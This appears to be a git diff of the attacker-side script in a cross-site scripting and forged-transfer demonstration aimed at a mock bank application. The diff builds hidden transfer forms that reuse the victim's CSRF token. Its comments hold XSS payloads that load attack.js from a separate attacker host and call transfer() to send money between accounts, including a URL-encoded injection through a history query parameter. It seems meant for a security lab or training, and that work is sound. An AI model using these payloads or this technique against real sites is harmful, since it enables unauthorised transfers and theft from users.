@@ -28,7 +28,7 @@ function addTransferForm(formname, fromAccount, toAccount, amount, currency, act
         createHiddenInput(form, "toAccountNo", toAccount);
         createHiddenInput(form, "amount", amount);
         createHiddenInput(form, "currency", currency);
-        createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>hello XSS');
+        createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>You have been XSS-ed!');
         var csrfToken = document.querySelector("meta[name='_csrf']").getAttribute("content");
         if (csrfToken) {
             createHiddenInput(form, "_csrf", csrfToken);
@@ -70,7 +70,7 @@ function submitTransferForm(formname, fromAccount) {
     }
 }
 
-//<script src="http://attack.0.0.0.0.xip.io:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","100","CHF")</script>
+//<script src="http://attack.0.0.0.0.xip.io:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","1000","CHF")</script>
 //<script src="http://attack.0.0.0.0.xip.io:9090/js/attack.js"></script><script>transfer("fromBob2","1-123456-11","3-123456-33","10000","CHF")</script>
 //http://v-bank.0.0.0.0.xip.io:8080/history?accountNo=1-123456-11%27+--+%3Cscript+src=%22http://attack.0.0.0.0.xip.io:9090/js/attack.js%22%3E%3C/script%3E%3Cscript%3Etransfer(null,%221-123456-11%22,%223-123456-33%22,%22800%22,%22CHF%22)%3C/script%3E
 
